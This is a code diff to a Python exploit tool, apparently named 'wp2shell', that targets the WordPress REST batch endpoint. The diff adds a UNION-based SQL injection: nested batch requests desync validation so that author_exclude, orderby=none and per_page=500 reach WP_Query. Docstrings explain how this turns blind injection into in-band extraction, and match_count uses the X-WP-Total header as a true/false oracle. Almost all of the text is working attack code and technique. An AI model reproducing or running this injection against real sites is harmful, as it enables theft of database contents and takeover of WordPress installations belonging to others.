@@ -17,6 +17,7 @@ from typing import Any, Optional
 # used so it cannot be mistaken for a network target.
 _DESYNC_PRIMER = {"method": "POST", "path": "///"}
 _BATCH_MARKER_CODES = ("parse_path_failed", "block_cannot_read", "rest_batch_not_allowed")
+POSTS_ITEM_SOURCE_PATH = "/wp/v2/posts/999999"
 
 
 class TargetError(Exception):
@@ -41,22 +42,20 @@ class BatchClient:
         base_url: str,
         *,
         timeout: float = 30.0,
-        rest_route: bool = False,
         proxy: Optional[str] = None,
         user_agent: str = "wp2shell",
     ) -> None:
         self.base_url = base_url.rstrip("/")
         self.timeout = timeout
-        self.rest_route = rest_route
         self.user_agent = user_agent
         handlers = [urllib.request.ProxyHandler({"http": proxy, "https": proxy})] if proxy else []
         self._opener = urllib.request.build_opener(*handlers)
 
     @property
     def endpoint(self) -> str:
-        if self.rest_route:
-            return f"{self.base_url}/?rest_route=/batch/v1"
-        return f"{self.base_url}/wp-json/batch/v1"
+        # ?rest_route= works on any install (including the plain-permalinks default); /wp-json/ would
+        # require pretty permalinks, so this form is always used.
+        return f"{self.base_url}/?rest_route=/batch/v1"
 
     def post(self, payload: dict) -> Response:
         request = urllib.request.Request(
@@ -143,26 +142,75 @@ class BatchClient:
         """Send a payload placing `author_not_in` into the WP_Query author__not_in clause."""
         return self.post(self._payload(author_not_in))
 
-    def rows(self, response: Response) -> Optional[list]:
-        """Return the inner get_items() result rows from a nested batch response, else None."""
+    def union_inject(self, author_not_in: str) -> Response:
+        """Send a payload that lands `author_not_in` in a non-split, no-ORDER-BY WP_Query.
+
+        The source request targets the single-post item route ``/wp/v2/posts/999999``, so it
+        validates against the item schema and the collection-only params ``author_exclude``,
+        ``orderby`` and ``per_page`` pass through unchecked. The inner desync then dispatches it
+        under the posts collection handler, which consumes them:
+
+        - ``orderby=none`` removes the trailing ``ORDER BY {posts}.<col>`` that otherwise makes a
+          ``UNION`` fail with "cannot be used in global ORDER clause";
+        - ``per_page=500`` keeps ``WP_Query`` in full-row (non-split) mode when no persistent object
+          cache is in use, so a ``UNION SELECT`` row survives as a fake ``WP_Post``.
+
+        Together these turn the blind sink into in-band UNION extraction (one request per value).
+        """
+        return self.post(self._union_payload(author_not_in))
+
+    @staticmethod
+    def _union_payload(author_not_in: str) -> dict:
+        query = urllib.parse.urlencode(
+            {"author_exclude": author_not_in, "orderby": "none", "per_page": "500"}
+        )
+        inner = {
+            "requests": [
+                _DESYNC_PRIMER,
+                {"method": "GET", "path": POSTS_ITEM_SOURCE_PATH + "?" + query},
+                {"method": "GET", "path": "/wp/v2/posts"},
+            ]
+        }
+        return {
+            "requests": [
+                _DESYNC_PRIMER,
+                {"method": "POST", "path": "/wp/v2/posts", "body": inner},
+                {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
+            ]
+        }
+
+    def match_count(self, response: Response) -> Optional[int]:
+        """Return X-WP-Total (the matched-row count) from the confused get_items response, else None.
+
+        The item-route source carries no ``page``, so the confused collection can paginate to an
+        empty ``body`` even when the injected condition matches rows -- but ``X-WP-Total`` still
+        reports the true count, so it, not the body list, is the reliable boolean signal.
+        """
         try:
             inner = response.json()["responses"][1]["body"]
-            result = inner["responses"][1]["body"]
+            headers = inner["responses"][1]["headers"]
         except (KeyError, IndexError, TypeError, ValueError):
             return None
-        return result if isinstance(result, list) else None
+        if not isinstance(headers, dict):
+            return None
+        try:
+            return int(headers.get("X-WP-Total"))
+        except (TypeError, ValueError):
+            return None
 
     @staticmethod
     def _payload(author_not_in: str) -> dict:
-        # Inner batch: a users request (whose collection schema has no `author_exclude`, so the
-        # value passes validation unchanged as a raw string) is desynced onto posts get_items(),
-        # which maps author_exclude -> WP_Query author__not_in.
+        # Inner batch: a GET on the single-post item route is validated as an item request, whose
+        # schema does not define the posts collection's `author_exclude` param. The desync then
+        # dispatches the same request under posts get_items(), which maps author_exclude ->
+        # WP_Query author__not_in.
         inner = {
             "requests": [
                 _DESYNC_PRIMER,
                 {
                     "method": "GET",
-                    "path": "/wp/v2/users?author_exclude="
+                    "path": POSTS_ITEM_SOURCE_PATH
+                    + "?author_exclude="
                     + urllib.parse.quote(author_not_in, safe=""),
                 },
                 {"method": "GET", "path": "/wp/v2/posts"},
